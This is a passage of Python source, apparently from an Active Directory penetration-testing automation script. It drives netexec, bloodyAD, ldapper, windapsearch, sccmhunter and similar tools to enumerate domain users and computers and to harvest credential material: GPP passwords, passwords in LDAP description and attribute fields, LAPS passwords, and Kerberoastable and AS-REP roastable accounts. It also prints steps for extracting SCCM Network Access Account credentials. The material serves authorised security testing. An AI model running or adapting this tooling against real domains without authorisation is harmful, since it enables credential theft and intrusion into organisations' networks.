    print("")

def enum4linux_enum():
    if not enum4linux_py:
        print(f"{RED}[-] Please verify the installation of enum4linux-ng{NC}")
        return # changed to return, as there's no point to continue
    print(f"{BLUE}[*] enum4linux Enumeration{NC}")

    if aeskey_bool:
        print(f"{PURPLE}[-] enum4linux does not support Kerberos authentication using AES Key{NC}")
        return

    run_command(f"{enum4linux_py} -A {argument_enum4linux} {target} -oJ {output_dir}/DomainRecon/enum4linux_{dc_domain}.txt")
    # Truncated output
    head_output = subprocess.getoutput(f"head -n 20 {output_dir}/DomainRecon/enum4linux_{dc_domain}.txt")
    print(head_output)
    print("............................(truncated output)")

    # jq parsing command
    subprocess.run(f'jq -r ".users[].username" "{output_dir}/DomainRecon/enum4linux_{dc_domain}.json"', shell=True,
                   stdout=open(f"{output_dir}/DomainRecon/Users/users_list_enum4linux_{dc_domain}.txt", "w"), stderr=subprocess.DEVNULL)

    if nullsess_bool:
        print(f"{CYAN}[*] Guest with empty password (null session){NC}")
        run_command(f"{enum4linux_py} -A {target} -u 'Guest' -p '' -oJ {output_dir}/DomainRecon/enum4linux_guest_{dc_domain}.txt")
        # Truncated output
        head_output_guest = subprocess.getoutput(f"head -n 20 {output_dir}/DomainRecon/enum4linux_guest_{dc_domain}.txt")
        print(head_output_guest)
        print("............................(truncated output)")

        # jq parsing command
        subprocess.run(f'jq -r ".users[].username" "{output_dir}/DomainRecon/enum4linux_guest_{dc_domain}.json"', shell=True,
                       stdout=open(f"{output_dir}/DomainRecon/Users/users_list_enum4linux_guest_{dc_domain}.txt", "w"), stderr=subprocess.DEVNULL)

    parse_users()
    print("")

def ne_gpp():
    print(f"{BLUE}[*] GPP Enumeration{NC}")
    run_command(f"{netexec} {ne_verbose} smb {target_dc} {argument_ne} -M gpp_autologin -M gpp_password")
    print("")

def ne_smb_enum():

    if nullsess_bool:
        print(f"{BLUE}[*] Users Enumeration (RPC Null session)${NC}")
        run_command(f"{netexec} {ne_verbose} smb {target} {argument_ne} --users")
        run_command(f"{netexec} {ne_verbose} smb {target} -u Guest -p '' --users")
        run_command(f"{netexec} {ne_verbose} smb {target} -u {rand_user} -p '' --users")
        # Parsing user lists from the command output, consolidating into a single file
        with open(f"{output_dir}/DomainRecon/Users/users_list_ne_smb_nullsess_{dc_domain}.txt", "w") as outfile:
            process = subprocess.run([f"{netexec} {ne_verbose} smb {target} {argument_ne} --users"], shell=True, capture_output=True, text=True)
            for line in process.stdout.splitlines():
                if "SMB" in line and "[-" not in line and "[+" not in line and "[*" not in line:
                     parts = line.split("\\")
                     if len(parts) > 1:
                         username = parts[1].split(" ")[0]
                         if username != "-Username-":
                              outfile.write(username+"\n")
    else:
        print(f"{BLUE}[*] Users / Computers Enumeration (RPC authenticated)${NC}")
        run_command(f"{netexec} {ne_verbose} smb {target} {argument_ne} --users")
        # Parsing user lists from the command output
        with open(f"{output_dir}/DomainRecon/Users/users_list_ne_smb_{dc_domain}.txt", "w") as outfile:
          process = subprocess.run([f"{netexec} {ne_verbose} smb {target} {argument_ne} --users"], shell=True, capture_output=True, text=True)
          for line in process.stdout.splitlines():
            if "SMB" in line and "[-" not in line and "[+" not in line and "[*" not in line:
              parts = line.split("\\")
              if len(parts) > 1:
                username = parts[1].split(" ")[0]
                if username != "-Username-":
                  outfile.write(username + "\n")
        run_command(f"{netexec} {ne_verbose} smb {target} {argument_ne} --computers")

    parse_users()
    print("")
    print(f"{BLUE}[*] Password Policy Enumeration{NC}")
    run_command(f"{netexec} {ne_verbose} smb {target} {argument_ne} --pass-pol")
    print("")

def ne_ldap_enum():
    ldaps_param = "--port 636" if ldaps_bool else ""
    if nullsess_bool:
        print(f"{BLUE}[*] Users Enumeration (LDAP Null session)${NC}")
        run_command(f"{netexec} {ne_verbose} ldap {target} {argument_ne} {ldaps_param} --users --kdcHost {dc_FQDN}")
        run_command(f"{netexec} {ne_verbose} ldap {target} -u Guest -p '' {ldaps_param} --users --kdcHost {dc_FQDN}")
        run_command(f"{netexec} {ne_verbose} ldap {target} -u {rand_user} -p '' {ldaps_param} --users --kdcHost {dc_FQDN}")
        # Consolidate and parse user lists from multiple command outputs
        with open(f"{output_dir}/DomainRecon/Users/users_list_ne_ldap_nullsess_{dc_domain}.txt", "w") as outfile:
          
            process = subprocess.run([f"{netexec} {ne_verbose} ldap {target} {argument_ne} {ldaps_param} --users --kdcHost {dc_FQDN}"], shell=True, capture_output=True, text=True)
            for line in process.stdout.splitlines():
                if "LDAP" in line and "[-" not in line and "[+" not in line:
                    username = line.split(" ")[-1]
                    if username != "-Username-":
                         outfile.write(username + "\n")

            process = subprocess.run([f"{netexec} {ne_verbose} ldap {target} -u Guest -p '' {ldaps_param} --users --kdcHost {dc_FQDN}"], shell=True, capture_output=True, text=True)
            for line in process.stdout.splitlines():
               if "LDAP" in line and "[-" not in line and "[+" not in line:
                    username = line.split(" ")[-1]
                    if username != "-Username-":
                         outfile.write(username + "\n")            
            
            process = subprocess.run([f"{netexec} {ne_verbose} ldap {target} -u {rand_user} -p '' {ldaps_param} --users --kdcHost {dc_FQDN}"], shell=True, capture_output=True, text=True)
            for line in process.stdout.splitlines():
                if "LDAP" in line and "[-" not in line and "[+" not in line:
                    username = line.split(" ")[-1]
                    if username != "-Username-":
                         outfile.write(username + "\n")
    else:
        print(f"{BLUE}[*] Users Enumeration (LDAP authenticated)${NC}")
        run_command(f"{netexec} {ne_verbose} ldap {target} {argument_ne} {ldaps_param} --users --kdcHost {dc_FQDN}")
        # Parse user lists from the command output
        with open(f"{output_dir}/DomainRecon/Users/users_list_ne_ldap_{dc_domain}.txt", "w") as outfile:
          process = subprocess.run([f"{netexec} {ne_verbose} ldap {target} {argument_ne} {ldaps_param} --users --kdcHost {dc_FQDN}"], shell=True, capture_output=True, text=True)
          for line in process.stdout.splitlines():
            if "LDAP" in line and "[-" not in line and "[+" not in line:
              username = line.split(" ")[-1]
              if username != "-Username-":
                outfile.write(username + "\n")

    parse_users()
    print("")
    print(f"{BLUE}[*] DC List Enumeration{NC}")
    run_command(f"{netexec} {ne_verbose} ldap {target} {argument_ne} {ldaps_param} --dc-list --kdcHost {dc_FQDN}")
    with open(f"{output_dir}/DomainRecon/Servers/dc_list_ne_ldap_{dc_domain}.txt", "w") as outfile:
        process = subprocess.run([f"{netexec} {ne_verbose} ldap {target} {argument_ne} {ldaps_param} --dc-list --kdcHost {dc_FQDN}"], shell=True, capture_output=True, text=True)
        for line in process.stdout.splitlines():
          if "LDAP" in line and "[-" not in line and "[+" not in line:
            dc_name = line.split(" ")[11] #Get the DC name
            outfile.write(dc_name+"\n")
            
    with open(f"{output_dir}/DomainRecon/Servers/dc_ip_list_ne_ldap_{dc_domain}.txt", "w") as outfile:
      process = subprocess.run([f"{netexec} {ne_verbose} ldap {target} {argument_ne} {ldaps_param} --dc-list --kdcHost {dc_FQDN}"], shell=True, capture_output=True, text=True)
      for line in process.stdout.splitlines():
        if "LDAP" in line and "[-" not in line and "[+" not in line:
          dc_ip = line.split(" ")[13] #Get the DC ip
          outfile.write(dc_ip+"\n")    

    parse_servers()
    print("")
    print("")
    print(f"{BLUE}[*] Password not required Enumeration{NC}")
    run_command(f"{netexec} {ne_verbose} ldap {target} {argument_ne} {ldaps_param} --password-not-required --kdcHost {dc_FQDN}")
    print("")
    print(f"{BLUE}[*] Users Description containing word: pass{NC}")
    run_command(f"{netexec} {ne_verbose} ldap {target} {argument_ne} {ldaps_param} -M get-desc-users --kdcHost {dc_FQDN}")
    pass_desc_file = f"{output_dir}/DomainRecon/ne_get-desc-users_pass_results_{dc_domain}.txt"
    
    process = subprocess.run([f"{netexec} {ne_verbose} ldap {target} {argument_ne} {ldaps_param} -M get-desc-users --kdcHost {dc_FQDN}"], shell=True, capture_output=True, text=True)
    with open(pass_desc_file, "w") as f:
       for line in process.stdout.splitlines():
         if any(keyword in line.lower() for keyword in ["pass", "pwd", "passwd", "password", "pswd", "pword"]):
           f.write(line.strip()+"\n")
           
    if os.path.getsize(pass_desc_file) > 0:
       with open(pass_desc_file, 'r') as f:
         content = f.read()
       if content.strip():  # Check if the file is not empty after stripping whitespace
         print(f"{GREEN}[+] Printing users with 'pass' in description...{NC}")
         print(content)
       else:
         print(f"{PURPLE}[-] No users with passwords in description found{NC}")
    else:
      print(f"{PURPLE}[-] No users with passwords in description found{NC}")

    print("")
    print(f"{BLUE}[*] Get MachineAccountQuota{NC}")
    run_command(f"{netexec} {ne_verbose} ldap {target} {argument_ne} {ldaps_param} -M maq --kdcHost {dc_FQDN}")
    print("")
    print(f"{BLUE}[*] Subnets Enumeration{NC}")
    run_command(f"{netexec} {ne_verbose} ldap {target} {argument_ne} {ldaps_param} -M subnets --kdcHost {dc_FQDN}")
    print("")
    print(f"{BLUE}[*] LDAP-signing check{NC}")
    run_command(f"{netexec} {ne_verbose} ldap {target_dc} {argument_ne} {ldaps_param} -M ldap-checker --kdcHost {dc_FQDN}")
    print("")

def deleg_enum():
    if not impacket_findDelegation:
        print(f"{RED}[-] findDelegation.py not found! Please verify the installation of impacket{NC}")
        return # changed to return, as there's no point to continue

    print(f"{BLUE}[*] Impacket findDelegation Enumeration{NC}")
    run_command(f"{impacket_findDelegation} {argument_imp} -dc-ip {dc_ip} -target-domain {dc_domain} -dc-host {dc_NETBIOS}")
    print(f"{BLUE}[*] findDelegation check (netexec){NC}")
    ldaps_param = "--port 636" if ldaps_bool else ""
    run_command(f"{netexec} {ne_verbose} ldap {target_dc} {argument_ne} {ldaps_param} --find-delegation --kdcHost {dc_FQDN}")
    print("")
    print(f"{BLUE}[*] Trusted-for-delegation check (netexec){NC}")
    ldaps_param = "--port 636" if ldaps_bool else ""
    run_command(f"{netexec} {ne_verbose} ldap {target_dc} {argument_ne} {ldaps_param} --trusted-for-delegation --kdcHost {dc_FQDN}")
    print("")

def fqdn_to_ldap_dn(fqdn: str) -> str:
    """
    Converts an FQDN to an LDAP distinguished name.
    """
    return ','.join(f"DC={part}" for part in fqdn.split("."))

def bloodyad_all_enum():
    if not bloodyad:
        print(f"{RED}[-] Please verify the installation of bloodyad{NC}")
        return # changed to return, as there's no point to continue

    os.makedirs(os.path.join(output_dir, "DomainRecon", "bloodyAD"), exist_ok=True)
    print(f"{BLUE}[*] bloodyad All Enumeration{NC}")

    if aeskey_bool or nullsess_bool:
        print(f"{PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key{NC}")
        return # changed to return, as there's no point to continue

    ldaps_param = "-s" if ldaps_bool else ""
    domain_DN = fqdn_to_ldap_dn(dc_domain)
    print(f"{CYAN}[*] Searching for attribute msDS-Behavior-Version{NC}")
    run_command(f"{bloodyad} {argument_bloodyad} {ldaps_param} --host {dc_FQDN} --dc-ip {dc_ip} get object {domain_DN} --attr msDS-Behavior-Version")
    print(f"{CYAN}[*] Searching for attribute ms-DS-MachineAccountQuota{NC}")
    run_command(f"{bloodyad} {argument_bloodyad} {ldaps_param} --host {dc_FQDN} --dc-ip {dc_ip} get object {domain_DN} --attr ms-DS-MachineAccountQuota")
    print(f"{CYAN}[*] Searching for attribute minPwdLength{NC}")
    run_command(f"{bloodyad} {argument_bloodyad} {ldaps_param} --host {dc_FQDN} --dc-ip {dc_ip} get object {domain_DN} --attr minPwdLength")
    print(f"{CYAN}[*] Searching for users{NC}")
    
    all_users_output = run_command(f"{bloodyad} {argument_bloodyad} {ldaps_param} --host {dc_FQDN} --dc-ip {dc_ip} get children --otype useronly")

    # Extract usernames and save to file
    with open(f"{output_dir}/DomainRecon/Users/users_list_bla_{dc_domain}.txt", "w") as f:
        for line in all_users_output.splitlines():
            if "CN=" in line:
                try:
                    username = line.split(',')[0].split('=')[1]
                    f.write(username + "\n")
                except:
                    pass

    parse_users()
    print(f"{CYAN}[*] Searching for computers{NC}")

    all_comp_output = run_command(f"{bloodyad} {argument_bloodyad} {ldaps_param} --host {dc_FQDN} --dc-ip {dc_ip} get children --otype computer")
    with open(f"{output_dir}/DomainRecon/Servers/servers_list_bla_{dc_domain}.txt", "w") as f:
      for line in all_comp_output.splitlines():
          if "CN=" in line:
              try:
                comp_name = line.split(',')[0].split('=')[1]
                if comp_name.strip():  # Ensure it's not empty
                  f.write(comp_name.strip() + f".{dc_domain}\n")
              except:
                pass
    parse_servers()
    print(f"{CYAN}[*] Searching for containers{NC}")
    run_command(f"{bloodyad} {argument_bloodyad} {ldaps_param} --host {dc_FQDN} --dc-ip {dc_ip} get children --otype container")
    print(f"{CYAN}[*] Searching for Kerberoastable{NC}")
    
    kerb_output = run_command(f"{bloodyad} {argument_bloodyad} {ldaps_param} --host {dc_FQDN} --dc-ip {dc_ip} get search --filter '(&(samAccountType=805306368)(servicePrincipalName=*))' --attr sAMAccountName")
    # Extract and save Kerberoastable accounts
    with open(f"{output_dir}/DomainRecon/bloodyAD/bloodyad_kerberoast_{dc_domain}.txt", "w") as f:
      for line in kerb_output.splitlines():
        if "sAMAccountName" in line:
          f.write(line.split(":")[1].strip()+"\n")
    print(f"{CYAN}[*] Searching for ASREPRoastable{NC}")
    run_command(f"{bloodyad} {argument_bloodyad} {ldaps_param} --host {dc_FQDN} --dc-ip {dc_ip} get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName")
    print("")

def bloodyad_write_enum():
    if not bloodyad:
        print(f"{RED}[-] Please verify the installation of bloodyad{NC}")
        return # changed to return, as there's no point to continue
    os.makedirs(os.path.join(output_dir, "DomainRecon", "bloodyAD"), exist_ok=True)
    if aeskey_bool or nullsess_bool:
        print(f"{PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key{NC}")
        return # changed to return, as there's no point to continue

    ldaps_param = "-s" if ldaps_bool else ""
    print(f"{BLUE}[*] bloodyad search for writable objects{NC}")
    run_command(f"{bloodyad} {argument_bloodyad} {ldaps_param} --host {dc_FQDN} --dc-ip {dc_ip} get writable")
    print("")

def bloodyad_dnsquery():
    if not bloodyad:
        print(f"{RED}[-] Please verify the installation of bloodyad{NC}")
        return # changed to return, as there's no point to continue
    os.makedirs(os.path.join(output_dir, "DomainRecon", "bloodyAD"), exist_ok=True)
    if aeskey_bool or nullsess_bool:
        print(f"{PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key{NC}")
        return # changed to return, as there's no point to continue

    ldaps_param = "-s" if ldaps_bool else ""
    print(f"{BLUE}[*] bloodyad dump DNS entries{NC}")
    dns_output = run_command(f"{bloodyad} {argument_bloodyad} {ldaps_param} --host {dc_FQDN} --dc-ip {dc_ip} get dnsDump")
    print(f"{YELLOW}If ADIDNS does not contain a wildcard entry, check for ADIDNS spoofing{NC}")
    # Process and print the DNS dump output (specifically looking for wildcard entries)
    for line in dns_output.splitlines():
      if "*" in line:
        print(line)

    print("")

def silenthound_enum():
    if not silenthound:
        print(f"{RED}[-] Please verify the location of silenthound{NC}")
        return # changed to return, as there's no point to continue

    os.makedirs(os.path.join(output_dir, "DomainRecon", "SilentHound"), exist_ok=True)
    print(f"{BLUE}[*] SilentHound Enumeration{NC}")

    # Check if results already exist
    if any(f for f in os.listdir(os.path.join(output_dir, "DomainRecon", "SilentHound")) if os.path.isfile(os.path.join(output_dir, "DomainRecon", "SilentHound", f)) and f != 'silenthound_output'):
        print(f"{YELLOW}[i] SilentHound results found, skipping... {NC}")
        return # changed to return, as there's no point to continue

    if kerb_bool or aeskey_bool:
        print(f"{PURPLE}[-] SilentHound does not support Kerberos authentication{NC}")
        return # changed to return, as there's no point to continue

    current_dir = os.getcwd()
    os.chdir(os.path.join(output_dir, "DomainRecon", "SilentHound"))
    ldaps_param = "--ssl" if ldaps_bool else ""
    run_command(f"{python3} {silenthound} {argument_silenthd} {dc_ip} {dc_domain} -g -n --kerberoast {ldaps_param} -o {output_dir}/DomainRecon/SilentHound/{dc_domain}")
    os.chdir(current_dir)

    # Process output files
    if os.path.exists(f"{output_dir}/DomainRecon/SilentHound/{dc_domain}-hosts.txt"):
      with open(f"{output_dir}/DomainRecon/SilentHound/{dc_domain}-hosts.txt", "r") as f:
          for line in f:
              try:
                  host, ip = line.strip().split(" ")
                  with open(f"{output_dir}/DomainRecon/Servers/servers_list_shd_{dc_domain}.txt", "a") as servers_file:
                      servers_file.write(f"{host.strip().replace(' ', '')}.{dc_domain}\n")
                  with open(f"{output_dir}/DomainRecon/Servers/ip_list_shd_{dc_domain}.txt", "a") as ip_file:
                      ip_file.write(f"{ip.strip()}\n")
              except ValueError:  # Handle lines that don't have the expected format
                pass
    
    if os.path.exists(f"{output_dir}/DomainRecon/SilentHound/{dc_domain}-users.txt"):
      try:
          shutil.copyfile(f"{output_dir}/DomainRecon/SilentHound/{dc_domain}-users.txt",
                        f"{output_dir}/DomainRecon/Users/users_list_shd_{dc_domain}.txt")
      except:
        pass

    # Truncated output
    if os.path.exists(f"{output_dir}/DomainRecon/SilentHound/silenthound_output_{dc_domain}.txt"):
      head_output = subprocess.getoutput(f"head -n 20 {output_dir}/DomainRecon/SilentHound/silenthound_output_{dc_domain}.txt")
      print(head_output)
      print("............................(truncated output)")
    print(f"{GREEN}[+] SilentHound enumeration complete.${NC}")
    parse_users()
    parse_servers()
    print("")

def ldeep_enum():
    if not ldeep:
        print(f"{RED}[-] Please verify the location of ldeep{NC}")
        return # changed to return, as there's no point to continue

    os.makedirs(os.path.join(output_dir, "DomainRecon", "ldeepDump"), exist_ok=True)
    print(f"{BLUE}[*] ldeep Enumeration{NC}")

    # Check if results already exist
    if any(f.endswith('.json') for f in os.listdir(os.path.join(output_dir, "DomainRecon", "ldeepDump"))):
        print(f"{YELLOW}[i] ldeep results found, skipping... {NC}")
        return # changed to return, as there's no point to continue

    if aeskey_bool:
        print(f"{PURPLE}[-] ldeep does not support Kerberos authentication using AES Key{NC}")
        return  # Skip if AES key auth is used

    ldaps_param = "-s ldaps://" if ldaps_bool or cert_bool else "-s ldap://"
    run_command(f"{ldeep} ldap {argument_ldeep} {ldaps_param}{target} all {output_dir}/DomainRecon/ldeepDump/{dc_domain}")

    # Copy user and computer lists
    try:
        shutil.copyfile(f"{output_dir}/DomainRecon/ldeepDump/{dc_domain}_users_all.lst",
                        f"{output_dir}/DomainRecon/Users/users_list_ldp_{dc_domain}.txt")
        shutil.copyfile(f"{output_dir}/DomainRecon/ldeepDump/{dc_domain}_computers.lst",
                        f"{output_dir}/DomainRecon/Servers/servers_list_ldp_{dc_domain}.txt")
    except FileNotFoundError:
        pass #Ignore if not found.

    parse_users()
    parse_servers()
    print("")

def windapsearch_enum():
    if not windapsearch:
        print(f"{RED}[-] Please verify the location of windapsearch{NC}")
        return

    os.makedirs(os.path.join(output_dir, "DomainRecon", "windapsearch"), exist_ok=True)
    print(f"{BLUE}[*] windapsearch Enumeration{NC}")

    if kerb_bool or aeskey_bool:
        print(f"{PURPLE}[-] windapsearch does not support Kerberos authentication{NC}")
        return

    ldaps_param = "--secure" if ldaps_bool else ""
    run_command(f"{windapsearch} {argument_windap} --dc {dc_ip} {ldaps_param} -m users --full")
    run_command(f"{windapsearch} {argument_windap} --dc {dc_ip} {ldaps_param} -m computers --full")
    run_command(f"{windapsearch} {argument_windap} --dc {dc_ip} {ldaps_param} -m groups --full")
    run_command(f"{windapsearch} {argument_windap} --dc {dc_ip} {ldaps_param} -m privileged-users --full")
    run_command(f"{windapsearch} {argument_windap} --dc {dc_ip} {ldaps_param} -m custom --filter '(&(objectCategory=computer)(servicePrincipalName=*))'")
    run_command(f"{windapsearch} {argument_windap} --dc {dc_ip} {ldaps_param} -m custom --filter '(objectCategory=user)(objectClass=user)(distinguishedName=%managedBy%)'")
    # Extract and save SQL servers (using cut)
    
    process = subprocess.run([f"{windapsearch} {argument_windap} --dc {dc_ip} {ldaps_param} -m custom --filter '(&(objectCategory=computer)(servicePrincipalName=MSSQLSvc*))' --attrs dNSHostName"], shell=True, capture_output=True, text=True)
    if process.returncode == 0:
      with open(f"{output_dir}/DomainRecon/Servers/sql_list_windap_{dc_domain}.txt", "w") as f:
        for line in process.stdout.splitlines():
          if "dNSHostName" in line:
            f.write(line.split(" ")[1]+"\n") # Assuming the format is "dNSHostName: <hostname>"
    

    # Parsing user and computer lists (using subprocess.run for simplicity)
    subprocess.run(f'grep -a "sAMAccountName:" "{output_dir}"/DomainRecon/windapsearch/windapsearch_users_{dc_domain}.txt | sed "s/sAMAccountName: //g" | sort -u', shell=True,
                   stdout=open(f"{output_dir}/DomainRecon/Users/users_list_windap_{dc_domain}.txt", "w"), stderr=subprocess.DEVNULL)
    subprocess.run(f'grep -a "dNSHostName:" "{output_dir}"/DomainRecon/windapsearch/windapsearch_servers_{dc_domain}.txt | sed "s/dNSHostName: //g" | sort -u', shell=True,
                   stdout=open(f"{output_dir}/DomainRecon/Servers/servers_list_windap_{dc_domain}.txt", "w"), stderr=subprocess.DEVNULL)
    subprocess.run(f'grep -a "cn:" "{output_dir}"/DomainRecon/windapsearch/windapsearch_groups_{dc_domain}.txt | sed "s/cn: //g" | sort -u', shell=True,
                   stdout=open(f"{output_dir}/DomainRecon/windapsearch/groups_list_windap_{dc_domain}.txt", "w"), stderr=subprocess.DEVNULL)

    # Search for passwords in fields (using grep)
    pass_fields_output = subprocess.getoutput(
        f'grep -iha "pass\|pwd" "{output_dir}"/DomainRecon/windapsearch/windapsearch_*_"${dc_domain}.txt" | grep -av "badPasswordTime\|badPwdCount\|badPasswordTime\|pwdLastSet\|have their passwords replicated\|RODC Password Replication Group\|msExch"')
    with open(f"{output_dir}/DomainRecon/windapsearch/windapsearch_pwdfields_{dc_domain}.txt", "w") as f:
        f.write(pass_fields_output)

    if os.path.getsize(f"{output_dir}/DomainRecon/windapsearch/windapsearch_pwdfields_{dc_domain}.txt") > 0:
        print(f"{GREEN}[+] Printing passwords found in LDAP fields...{NC}")
        with open(f"{output_dir}/DomainRecon/windapsearch/windapsearch_pwdfields_{dc_domain}.txt", 'r') as f:
          content = f.read()
          print(content)

    print(f"{GREEN}[+] windapsearch enumeration of users, servers, groups complete.{NC}")
    parse_users()
    parse_servers()
    print("")

def ldapwordharv_enum():
    if not LDAPWordlistHarvester:
        print(f"{RED}[-] Please verify the installation of LDAPWordlistHarvester{NC}")
        return

    print(f"{BLUE}[*] Generating wordlist using LDAPWordlistHarvester{NC}")
    if nullsess_bool:
        print(f"{PURPLE}[-] LDAPWordlistHarvester requires credentials{NC}")
        return

    ldaps_param = "--ldaps" if ldaps_bool else ""
    verbose_p0dalirius = "-v --debug" if verbose_bool else ""
    run_command(f"{python3} {LDAPWordlistHarvester} {argument_p0dalirius} {verbose_p0dalirius} {ldaps_param} --kdcHost {dc_FQDN} --dc-ip {dc_ip} -o {output_dir}/DomainRecon/ldapwordharv_{dc_domain}.txt")
    print("")

def rdwatool_enum():
    if not rdwatool:
        print(f"{RED}[-] Please verify the installation of rdwatool{NC}")
        return
    print(f"{BLUE}[*] Enumerating RDWA servers using rdwatool{NC}")
    run_command(f"{rdwatool} recon -tf {servers_hostname_list} -k")
    print("")

def ne_sccm():
    print(f"{BLUE}[*] SCCM Enumeration using netexec{NC}")
    run_command(f"echo -n Y | {netexec} {ne_verbose} ldap {target_dc} {argument_ne} -M sccm -o REC_RESOLVE=TRUE")
    print("")

def sccmhunter_enum():
    if not sccmhunter:
        print(f"{RED}[-] Please verify the installation of sccmhunter{NC}")
        return

    print(f"{BLUE}[*] Enumeration of SCCM using sccmhunter{NC}")
    if nullsess_bool:
        print(f"{PURPLE}[-] sccmhunter requires credentials{NC}")
        return

    ldaps_param = "-ldaps" if ldaps_bool else ""
    # Clear logs directory
    subprocess.run("rm -rf $HOME/.sccmhunter/logs/ 2>/dev/null", shell=True, executable='/bin/bash')

    run_command(f"{python3} {sccmhunter} find {argument_sccm} {ldaps_param} -dc-ip {dc_ip}")
    run_command(f"{python3} {sccmhunter} smb {argument_sccm} {ldaps_param} -dc-ip {dc_ip} -save")
    #Using shell and check output with grep
    process = subprocess.run([f"{python3} {sccmhunter} find {argument_sccm} {ldaps_param} -dc-ip {dc_ip}"], shell=True, capture_output=True, text=True)
    
    if "SCCM doesn't" not in process.stdout and "Traceback" not in process.stdout :
        run_command(f"{python3} {sccmhunter} show -users")
        run_command(f"{python3} {sccmhunter} show -computers")
        run_command(f"{python3} {sccmhunter} show -groups")
        run_command(f"{python3} {sccmhunter} show -mps")
        print(f"{GREEN}[+] SCCM server found! Follow steps below to add a new computer and extract the NAAConfig containing creds of Network Access Accounts:{NC}")
        print(f"{python3} {sccmhunter} http {argument_sccm} {ldaps_param} -dc-ip {dc_ip} -auto")
    print("")

def ldapper_enum():
    if not ldapper:
        print(f"{RED}[-] Please verify the installation of ldapper{NC}")
        return # changed to return, as there's no point to continue

    print(f"{BLUE}[*] Enumeration of LDAP using ldapper{NC}")
    if nullsess_bool or kerb_bool or aeskey_bool:
        print(f"{PURPLE}[-] ldapper requires credentials and does not support Kerberos authentication{NC}")
        return # changed to return, as there's no point to continue

    os.makedirs(os.path.join(output_dir, "DomainRecon", "LDAPPER"), exist_ok=True)
    ldaps_param = "-n 1" if ldaps_bool else "-n 2"

    print(f"{CYAN}[*] Get all users{NC}")
    run_command(f"{python3} {ldapper} {argument_ldapper} {ldaps_param} -S {dc_ip} -m 0 -s '1' -f json > {output_dir}/DomainRecon/LDAPPER/users_output_{dc_domain}.json")
    subprocess.run(f'jq -r ".[].samaccountname" "{output_dir}/DomainRecon/LDAPPER/users_output_{dc_domain}.json"', shell=True,
                   stdout=open(f"{output_dir}/DomainRecon/Users/users_list_ldapper_{dc_domain}.txt", "w"), stderr=subprocess.DEVNULL)

    print(f"{CYAN}[*] Get all groups (and their members){NC}")
    run_command(f"{python3} {ldapper} {argument_ldapper} {ldaps_param} -S {dc_ip} -m 0 -s '2' -f json > {output_dir}/DomainRecon/LDAPPER/groups_output_{dc_domain}.json")

    print(f"{CYAN}[*] Get all printers{NC}")
    run_command(f"{python3} {ldapper} {argument_ldapper} {ldaps_param} -S {dc_ip} -m 0 -s '3' -f json > {output_dir}/DomainRecon/LDAPPER/printers_output_{dc_domain}.json")

    print(f"{CYAN}[*] Get all computers{NC}")
    run_command(f"{python3} {ldapper} {argument_ldapper} {ldaps_param} -S {dc_ip} -m 0 -s '4' -f json > {output_dir}/DomainRecon/LDAPPER/computers_output_{dc_domain}.json")
    subprocess.run(f'jq -r ".[].dnshostname" "{output_dir}/DomainRecon/LDAPPER/computers_output_{dc_domain}.json"', shell=True,
                   stdout=open(f"{output_dir}/DomainRecon/Servers/servers_list_ldapper_{dc_domain}.txt", "w"), stderr=subprocess.DEVNULL)

    print(f"{CYAN}[*] Get Domain/Enterprise Administrators{NC}")
    run_command(f"{python3} {ldapper} {argument_ldapper} {ldaps_param} -S {dc_ip} -m 0 -s '5' -f json > {output_dir}/DomainRecon/LDAPPER/admins_output_{dc_domain}.json")

    print(f"{CYAN}[*] Get Domain Trusts{NC}")
    run_command(f"{python3} {ldapper} {argument_ldapper} {ldaps_param} -S {dc_ip} -m 0 -s '6' -f json > {output_dir}/DomainRecon/LDAPPER/trusts_output_{dc_domain}.json")

    print(f"{CYAN}[*] Search for Unconstrained SPN Delegations (Potential Priv-Esc){NC}")
    run_command(f"{python3} {ldapper} {argument_ldapper} {ldaps_param} -S {dc_ip} -m 0 -s '7' -f json > {output_dir}/DomainRecon/LDAPPER/unconstrained_output_{dc_domain}.json")

    print(f"{CYAN}[*] Search for Accounts where PreAuth is not required. (ASREPROAST){NC}")
    run_command(f"{python3} {ldapper} {argument_ldapper} {ldaps_param} -S {dc_ip} -m 0 -s '8' -f json > {output_dir}/DomainRecon/LDAPPER/asrep_output_{dc_domain}.json")

    print(f"{CYAN}[*] Search for User SPNs (KERBEROAST){NC}")
    run_command(f"{python3} {ldapper} {argument_ldapper} {ldaps_param} -S {dc_ip} -m 0 -s '9' -f json > {output_dir}/DomainRecon/LDAPPER/kerberoastable_output_{dc_domain}.json")

    print(f"{CYAN}[*] Show All LAPS LA Passwords (that you can see){NC}")
    run_command(f"{python3} {ldapper} {argument_ldapper} {ldaps_param} -S {dc_ip} -m 0 -s '10' -f json > {output_dir}/DomainRecon/LDAPPER/ldaps_output_{dc_domain}.json")

    print(f"{CYAN}[*] Search for common plaintext password attributes (UserPassword, UnixUserPassword, unicodePwd, and msSFU30Password){NC}")
    run_command(f"{python3} {ldapper} {argument_ldapper} {ldaps_param} -S {dc_ip} -m 0 -s '11' -f json > {output_dir}/DomainRecon/LDAPPER/passwords_output_{dc_domain}.json")

    print(f"{CYAN}[*] Show All Quest Two-Factor Seeds (if you have access){NC}")
    run_command(f"{python3} {ldapper} {argument_ldapper} {ldaps_param} -S {dc_ip} -m 0 -s '12' -f json > {output_dir}/DomainRecon/LDAPPER/quest_output_{dc_domain}.json")

    print(f"{CYAN}[*] Oracle 'orclCommonAttribute'SSO password hash{NC}")
    run_command(f"{python3} {ldapper} {argument_ldapper} {ldaps_param} -S {dc_ip} -m 0 -s '13' -f json > {output_dir}/DomainRecon/LDAPPER/oracle_sso_common_output_{dc_domain}.json")

    print(f"{CYAN}[*] Oracle 'userPassword' SSO password hash{NC}")
    run_command(f"{python3} {ldapper} {argument_ldapper} {ldaps_param} -S {dc_ip} -m 0 -s '14' -f json > {output_dir}/DomainRecon/LDAPPER/oracle_sso_pass_output_{dc_domain}.json")

    print(f"{CYAN}[*] Get SCCM Servers{NC}")
    run_command(f"{python3} {ldapper} {argument_ldapper} {ldaps_param} -S {dc_ip} -m 0 -s '15' -f json > {output_dir}/DomainRecon/LDAPPER/sccm_output_{dc_domain}.json")
    print("")

def adalanche_enum():
    if not adalanche:
        print(f"{RED}[-] Please verify the installation of Adalanche{NC}")
        return

